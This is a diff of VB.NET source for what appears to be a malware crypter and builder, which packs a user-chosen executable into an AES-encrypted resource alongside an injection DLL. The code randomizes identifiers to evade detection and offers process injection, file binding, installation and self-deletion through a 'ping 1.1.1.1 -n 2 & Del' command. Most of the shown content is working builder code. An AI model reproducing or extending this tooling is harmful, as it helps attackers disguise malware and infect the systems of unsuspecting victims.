@@ -56,7 +56,7 @@
 
 #Region "S e t t i n g s"
 
-    Private Sub chkDrop_Click(sender As Object, e As EventArgs) 
+    Private Sub chkDrop_Click(sender As Object, e As EventArgs)
         If chkDrop.Checked = True Then
             txtDropName.Enabled = True
             txtDropPath.Enabled = True
@@ -205,6 +205,11 @@
     Public Shared OutputPayload As String = String.Empty
     Public Shared Key As String = String.Empty
 
+    Public Shared ResName As String = Helper.Randomi(Helper.rand.Next(6, 12))
+    Public Shared ResPayload = Helper.Randomi(Helper.rand.Next(5, 10))
+    Public Shared ResDLL = Helper.Randomi(Helper.rand.Next(5, 10))
+    Public Shared ResBind = Helper.Randomi(Helper.rand.Next(5, 10))
+
     Private Sub btnBuild_Click(sender As Object, e As EventArgs) Handles btnBuild.Click
 
         Try
@@ -212,15 +217,13 @@
             Dim s As New SaveFileDialog
             s.Filter = "Executable |*.exe"
             If s.ShowDialog = DialogResult.OK Then
+
                 Dim Source As String = My.Resources.Source
                 OutputPayload = s.FileName
 
                 txtLog.Text = "Generating encryption key..." + Environment.NewLine
                 Key = Helper.Randomi(12)
                 Source = Replace(Source, "%KEY%", Key)
-
-                txtLog.AppendText("Writing Payload..." + Environment.NewLine)
-                Source = Replace(Source, "%Payload%", Helper.iformat(IO.File.ReadAllBytes(txtPayload.Text)))
 
                 If chkRegasm.Checked = True Then
                     txtLog.AppendText("Injection..." + Environment.NewLine)
@@ -236,9 +239,9 @@
                 Source = Replace(Source, "%Run%", Helper.Randomi(Helper.rand.Next(6, 12)))
                 Source = Replace(Source, "%Asm%", Helper.Randomi(Helper.rand.Next(6, 12)))
                 Source = Replace(Source, "%Res%", Helper.Randomi(Helper.rand.Next(6, 12)))
-                Source = Replace(Source, "%ResName%", Codedom.ResName)
-                Source = Replace(Source, "%EncyptedPayload%", Codedom.ResPayload)
-                Source = Replace(Source, "%EncryptedDLL%", Codedom.ResDLL)
+                Source = Replace(Source, "%ResName%", ResName)
+                Source = Replace(Source, "%EncyptedPayload%", ResPayload)
+                Source = Replace(Source, "%EncryptedDLL%", ResDLL)
                 Source = Replace(Source, "%DecAdd%", Helper.Randomi(Helper.rand.Next(6, 12)))
                 Source = Replace(Source, "%DecDLL%", Helper.Randomi(Helper.rand.Next(6, 12)))
                 Source = Replace(Source, "%DLL%", Helper.Randomi(Helper.rand.Next(6, 12)))
@@ -269,8 +272,6 @@
 
                 Source = Replace(Source, "%Info%", Helper.Randomi(Helper.rand.Next(6, 12)))
 
-
-
                 If chkDrop.Checked = True Then
                     txtLog.AppendText("Enabling Installation..." + Environment.NewLine)
                     Source = Replace(Source, "'%Drop%", Nothing)
@@ -300,8 +301,6 @@
                     Source = Replace(Source, "%DEL%", Algorithm.AES_Encrypt("/C ping 1.1.1.1 -n 2 & Del ", Key))
                 End If
 
-
-
                 If chkAssembly.Checked = True Then
                     txtLog.AppendText("Writing Assembly Information..." + Environment.NewLine)
                     Source = Replace(Source, "'%ASSEMBLY%", Nothing)
@@ -320,7 +319,7 @@
                 If chkBind.Checked = True AndAlso IO.File.Exists(txtBind.Text) = True Then
                     txtLog.AppendText("Bind File..." + Environment.NewLine)
                     Source = Replace(Source, "%BindName%", IO.Path.GetFileName(txtBind.Text))
-                    Source = Replace(Source, "%EncryptedBind%", Codedom.ResBind)
+                    Source = Replace(Source, "%EncryptedBind%", ResBind)
                     Source = Replace(Source, "%DecBind%", Helper.Randomi(Helper.rand.Next(6, 12)))
                     Source = Replace(Source, "%Binder%", Helper.Randomi(Helper.rand.Next(6, 12)))
                     Source = Replace(Source, "%BindSub%", Helper.Randomi(Helper.rand.Next(6, 12)))
@@ -337,6 +336,16 @@
                     Source = Replace(Source, "'$Delay%", Nothing)
                     Source = Replace(Source, "%Delay1%", numDelay.Value)
                 End If
+
+
+                Using R As New Resources.ResourceWriter(IO.Path.GetTempPath & "\" + ResName + ".Resources")
+                    R.AddResource(ResPayload, Algorithm.AES_Encrypt(Convert.ToBase64String((IO.File.ReadAllBytes(txtPayload.Text))), Main.Key))
+                    R.AddResource(ResDLL, Algorithm.AES_Encrypt(Convert.ToBase64String(My.Resources.PE), Main.Key))
+                    If chkBind.Checked = True AndAlso IO.File.Exists(txtBind.Text) = True Then
+                        R.AddResource(ResBind, Algorithm.AES_Encrypt(Convert.ToBase64String(IO.File.ReadAllBytes(txtBind.Text)), Main.Key))
+                    End If
+                    R.Generate()
+                End Using
 
                 Codedom.Compiler(OutputPayload, Source)
 
